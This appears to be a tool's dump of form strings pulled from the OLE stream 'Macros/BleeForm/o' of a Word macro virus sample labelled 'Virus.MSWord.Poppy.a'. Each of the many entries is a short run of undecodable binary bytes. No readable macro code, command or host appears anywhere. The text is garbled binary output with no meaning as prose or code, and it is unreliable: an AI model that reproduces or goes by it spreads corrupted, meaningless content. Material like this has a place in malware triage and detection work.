VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X�N0rOQư�V�1j��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y�=2~�zu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Gs�J�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@m�Y������D��s�d`����C[��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p~��遯��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l�M�Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��2s�C���Z�����MEf��<�0�����	��}�:{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�/�D�Y�U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Gy��26@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�A����gF��T]��5�Z�`���Ӫ��z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�mIfm�;e��b�Wh*�tl�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>&uޣ��U�u��lP��|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@��3�9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Dih�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�ee]H{�ʆ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9M�� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����U��\���cb�sϴ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
޾����ӛ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-�_5M��ik�
�t��T<�
BX)+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ڲ+l����K���{h��pE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�]��O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Aq "P��R7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1��V��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V�DX�4F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ڠ�#�F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ᩱA�dk�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�SWG_U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(�,Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*�.�0�g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���>O{_�R=��v��_f��RS��ֵ���W�5@�'E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�wHQ$�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{P��n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1\��ā�2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>L�I`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�H[hc��g���y��o>�BKbA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$��
��Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L����n�Ua��J��ƪ���A#��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�D!؅�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:y{�r7BP�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t�m���I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]%U;R�M,��2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[|i��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N9R�B�`���XS�ܒ;���z��^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,�/ b��
bc�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tz�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����x�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#0`B4�"\��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����E)��S�4t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!���CyeA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Hé����.�M�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�OQM:|lU�P��-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`�U�m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\�d���%��R?�_:�3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ă��
�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1��T7[��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VI���V�iB#�J�F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D���%��ߩ>C���#8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ee4YTR�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$���G�Ee�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1�\t,��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s��E�;�8=n�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�mq*��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�B6,}2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�m9<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=0���z�e�
�⍚
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	P2��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=yp�����O38�@p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�OA�==�=s$e��~_RO�^�-;�MK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v�)����u�ۺ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�]��L�۰?�B�L͹
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%F��x
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,�j���Q<4����7ȿ*�!r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�oO�}}�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E�lS)��KF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I6�ܧ��=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<�`����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i���Wv��u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�auD�Y�;Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Ӷ뎞�t�r{İ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Љ!à��loV��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0 +se���C,�V�j�秒
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x܆�z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��9UܥX�ܕ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%kd�I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
DE�#�
A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$z�pT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#�Fk��Қ(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���G��u�KkIMl�c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X�h�te�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3���A,6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P6�I��D�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��yH��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FAC�G�ǮA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������VP[��I[r`Ȇ�$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:>��e�;�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G;�6~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2�GC�Z��$x|�}��򵗳�"��PW�c,r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����=XM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[uj�W��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o,>a�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G�x��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i�OQiZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�"����4�j�h�M���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Zn������ʂ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����^}
�G6>[9��Z7c�,ɺ*�r���d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N�_r%x
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���B��q�ߪ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A�V�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{FLp�&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s����zz�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tSb�����*�����ߥ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:!�\��`�Rys�#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���6}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ۦ��R�ٌ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G����x�Y�s�6W��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a�|������n��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���FN=���x�ߦ�h�l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
uRn��^E4���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p܌���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M��mCXe�\�B����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p~���v�=mB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w�
��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^H䓜t0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/(hN=}]��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
